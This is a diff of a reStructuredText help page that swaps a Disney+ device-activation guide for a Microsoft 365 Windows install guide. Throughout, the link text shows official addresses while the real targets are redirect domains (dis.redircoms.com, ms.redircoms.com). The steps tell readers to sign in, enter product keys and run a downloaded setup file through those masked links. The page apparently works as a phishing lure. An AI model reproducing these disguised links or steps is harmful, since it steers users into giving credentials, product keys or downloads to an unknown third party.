@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Install and Setup Microsoft 365 on Windows: Step-by-Step
 ##################
 
 .. meta::
@@ -14,35 +14,43 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: microsoft365.com/setup
+   :target: https://ms.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+To get started with Microsoft 365 on your Windows PC, visit `microsoft365.com/setup <https://dis.redircoms.com>`_. This official setup portal allows you to redeem your product key, download the installer, and activate Microsoft 365 apps like Word, Excel, and Outlook quickly and securely.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Install Microsoft 365 on Windows
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open your web browser and go to `microsoft365.com/setup <https://ms.redircoms.com>`_.
+2. Sign in using your Microsoft account, or create a new one if needed.
+3. Enter your **25-character product key** when prompted.
+4. Select your language and version (32-bit or 64-bit), then click **Install**.
+5. The Office setup file will download to your computer.
 
 **********
-What to Do After Activation
+Steps to Set Up Microsoft 365 After Installation
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+1. Locate and double-click the downloaded setup file to begin installation.
+2. Follow the on-screen instructions to complete the installation process.
+3. Once installed, open any Office app such as Word or Excel.
+4. Sign in again with your Microsoft account to activate your subscription.
+5. Office will now be fully activated and ready to use on your Windows device.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Benefits of Microsoft 365 Installation
+**********
+
+- Access to the latest Office apps and cloud features.
+- Automatic updates and 1 TB of OneDrive cloud storage.
+- Seamless integration with Windows and Microsoft services.
+- Use your Microsoft 365 account across multiple compatible devices.
+
+Visit `microsoft365.com/setup <https://ms.redircoms.com>`_ today to activate and install Microsoft 365, and enjoy powerful productivity tools tailored for Windows.
